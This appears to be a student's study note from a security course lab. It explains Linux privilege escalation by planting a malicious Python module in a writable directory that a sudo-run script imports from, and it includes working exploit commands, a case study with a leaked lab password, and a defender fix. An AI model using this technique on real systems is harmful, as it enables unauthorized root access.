#linux #privesc

A privileged job (sudo rule, cron) runs a **Python script**, and you can write to a directory that script **imports from**. Python resolves `import X` by searching `sys.path` — and `sys.path[0]` is the **script's own directory**. If you can write there, drop your own `X.py` and your code runs with the script's privileges (root). The module's top-level code executes **at import time**, so you don't even need the function the script calls.

## The setup to recognize
```
sudo -l   →   (root) NOPASSWD: /usr/bin/python3 /opt/audit/run.py
```
Then read the script:
```bash
cat /opt/audit/run.py        # e.g.  import auditlib ; auditlib.run()
ls -ld /opt/audit            # can you write here? (own the dir, or group/other write)
```
Vulnerable when: the script `import`s a module, and you can write to the dir Python resolves it from (usually the script's own dir — `sys.path[0]`).

> Note: owning the **directory** is enough even if the existing `auditlib.py` is root-owned — directory write permission lets you delete/replace files inside it.

## Exploit
```bash
cp /opt/audit/auditlib.py /tmp/auditlib.py.bak 2>/dev/null   # back up the real one

cat > /opt/audit/auditlib.py <<'EOF'
import os
def run():          # keep the symbol the script calls, so no traceback after
    pass
os.setuid(0)        # redundant under sudo (already root), harmless
os.system("cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt")
EOF

sudo /usr/bin/python3 /opt/audit/run.py
cat /tmp/flag.txt

cp /tmp/auditlib.py.bak /opt/audit/auditlib.py 2>/dev/null   # restore
```
- Payload runs **at import** (top-level code), before `run()` is ever called — so it fires regardless.
- Non-interactive (copy + exit), not a shell — the fragile-box lesson from [[LD_PRELOAD]].
- Related forms: a script that `source`s a writable shell file; a writable `PYTHONPATH` dir; a writable module anywhere earlier on `sys.path` than the real one.

## Defender fix
Don't run scripts from world/group-writable dirs as root; pin `sys.path`; keep the script's directory and its imports root-owned and non-writable.

---
## Case study — CYBR401 Lab 8 (c12 → svc → root, two hops)
Capstone chaining three techniques:
1. **Leaked cred → svc.** `/var/backups/provision.log` contained `sshpass -p '4e1c37bdcd4e' ssh svc@127.0.0.1 ...` — a password on a command line, captured in a provisioning log (→ [[11.5 Hunting Leaked Credentials]]). `su svc`.
2. **svc's sudo rule.** `(root) NOPASSWD: /usr/bin/python3 /opt/audit/run.py`, and `run.py` did `import auditlib`.
3. **Writable import dir.** `/opt/audit` was `drwxrwxr-x svc svc` — svc-writable. Planted a malicious `auditlib.py`; `sudo python3 /opt/audit/run.py` imported it as root → flag.

The payoff of box 1's decoy: `/opt/audit/run.py` + `import auditlib` existed back then but was unexploitable (no write access, no trigger). c12 added the writable dir **and** the sudo trigger.

**Takeaways logged:** a root-run script that `import`s a module + a writable import dir (usually the script's own dir = `sys.path[0]`) = code exec as root. Own the dir → replace the module. Payload at import-time; keep a matching function to avoid a traceback; non-interactive.

---
Related: [[11.5 Hunting Leaked Credentials]] · [[Cron Jobs]] · [[PATH Hijacking]] · [[LD_PRELOAD]] · [[11.1 Where to start]]
